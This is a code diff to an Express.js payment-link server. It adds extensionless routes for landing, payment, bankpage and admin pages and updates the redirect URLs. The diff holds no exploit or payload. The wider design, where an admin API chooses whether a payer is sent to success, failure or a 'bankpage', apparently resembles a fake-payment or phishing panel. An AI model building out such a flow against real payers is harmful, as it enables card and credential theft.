@@ -3,6 +3,7 @@ import bodyParser from 'body-parser';
 import cors from 'cors';
 import crypto from 'crypto';
 import { Server } from 'socket.io';
+import path from 'path'; // Add this import
 
 const app = express();
 app.use(bodyParser.json());
@@ -10,6 +11,23 @@ app.use(cors({
   origin: '*',
   methods: ['GET', 'POST']
 }));
+
+// Clean URL handling - Add this section
+const htmlPages = ['landing', 'payment', 'success', 'fail', 'bankpage', 'admin'];
+
+// Add route handlers for clean URLs (without .html extension)
+htmlPages.forEach(page => {
+  app.get(`/${page}`, (req, res) => {
+    res.sendFile(path.join(process.cwd(), `${page}.html`));
+  });
+});
+
+// Redirect root to landing page (optional)
+app.get('/', (req, res) => {
+  res.redirect('/landing');
+});
+
+// Serve static files after our routes
 app.use(express.static("."));
 
 const PORT = process.env.PORT || 3000;
@@ -36,7 +54,9 @@ app.post('/api/generatePaymentLink', (req, res) => {
 
     const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
     const protocol = req.headers['x-forwarded-proto'] || req.protocol;
-    const paymentLink = `${protocol}://${req.get('host')}/landing.html?pid=${invoiceId}`;
+    
+    // Updated URL without .html
+    const paymentLink = `${protocol}://${req.get('host')}/landing?pid=${invoiceId}`;
 
     paymentLinks.set(invoiceId, {
       amount: parseFloat(amount),
@@ -138,10 +158,11 @@ app.get('/api/checkTransactionStatus', (req, res) => {
   }
 
   if (txn.redirectStatus) {
+    // Updated URLs without .html
     const redirectUrls = {
-      success: `/success.html?invoiceId=${invoiceId}`,
-      fail: `/fail.html?invoiceId=${invoiceId}${txn.failureReason ? `&reason=${txn.failureReason}` : ''}`,
-      bankpage: `/bankpage.html?invoiceId=${invoiceId}`
+      success: `/success?invoiceId=${invoiceId}`,
+      fail: `/fail?invoiceId=${invoiceId}${txn.failureReason ? `&reason=${txn.failureReason}` : ''}`,
+      bankpage: `/bankpage?invoiceId=${invoiceId}`
     };
     return res.json({ status: "redirect", redirectUrl: redirectUrls[txn.redirectStatus] });
   }
@@ -171,16 +192,17 @@ app.post('/api/updateRedirectStatus', (req, res) => {
     txn.failureReason = failureReason;
   }
 
+  // Updated URLs without .html
   const redirectUrls = {
-    success: `/success.html?invoiceId=${invoiceId}`,
-    fail: `/fail.html?invoiceId=${invoiceId}${failureReason ? `&reason=${failureReason}` : ''}`
+    success: `/success?invoiceId=${invoiceId}`,
+    fail: `/fail?invoiceId=${invoiceId}${failureReason ? `&reason=${failureReason}` : ''}`
   };
 
   res.json({
     status: "success",
     invoiceId,
     redirectStatus,
-    redirectUrl: redirectUrls[redirectStatus] || `/bankpage.html?invoiceId=${invoiceId}`
+    redirectUrl: redirectUrls[redirectStatus] || `/bankpage?invoiceId=${invoiceId}`
   });
 });
 
